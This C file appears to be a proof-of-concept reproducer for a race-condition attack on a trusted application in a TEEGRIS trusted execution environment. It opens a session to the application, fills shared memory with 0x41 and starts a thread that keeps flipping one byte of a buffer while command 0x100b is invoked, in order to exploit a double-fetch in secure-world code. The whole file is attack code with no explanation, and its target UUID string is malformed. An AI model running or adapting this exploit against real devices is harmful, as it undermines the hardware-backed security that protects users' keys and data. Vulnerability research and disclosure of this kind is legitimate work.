#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "tee_client_api.h"
#include "repro.h"
#include <dlfcn.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>  

TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*,
			     TEEC_Session*,
			     const TEEC_UUID*,
			     uint32_t,
			     const void*,
			     TEEC_Operation*,
			     uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*,uint32_t,TEEC_Operation*,uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);

void* mod_thread(void* arg){
    while(1){
        ((char*)arg)[0x20] = 0;
        ((char*)arg)[0x20] = 0x41;
    }
}

void send_req(TEEC_Context *context, TEEC_Session *session)
{
    void* mem_area1 = allocate_param_mem(context, 0x1000);
    void* mem_area2 = allocate_param_mem(context, 0x1000);
    
    uint32_t err_origin;
    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_INOUT,TEEC_MEMREF_TEMP_INPUT,
                                     TEEC_NONE, TEEC_NONE);
    printf("params: 0x%lx\n", op.paramTypes);
    
    op.params[0].tmpref.buffer = mem_area1;  
    op.params[0].tmpref.size =  0x370; 
    op.params[1].tmpref.buffer = mem_area2; 
    op.params[1].tmpref.size =  0x100; 
    op.params[0].value.a = 4;
    op.params[0].value.b = 4;
    
    memset(mem_area2, 0x41, 0x90);
    
    pthread_t tid;
    if (pthread_create(&tid, NULL, mod_thread, mem_area2) != 0) {
        perror("pthread_create failed");
        return;
    }

    TEEC_Result res = TEEC_InvokeCommand_impl(session, 0x100b, &op, &err_origin);
}


int main(int argc, char **argv)
{
    char* ta = "377ee4e8-af0e-474f-a9d636a9268fe85c";
    TEEC_UUID *uuid = teegris_uuid(ta);

    TEEC_Context context;
    TEEC_Session session;
    uint32_t err_origin;
    TEEC_Result res;

    load_functions();

    // Initialize context
    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_InitializeContext failed with code 0x%x\n", res);
        exit(-1);
    }
    // Open session to trusted application
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                           NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_OpenSession failed with code 0x%x origin 0x%x\n",
               res, err_origin);
        TEEC_FinalizeContext_impl(&context);
        exit(-1);
    }

    // write banner
    printf("[+] sending query...\n");
    send_req(&context, &session);
    printf("[+] done...\n");
    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
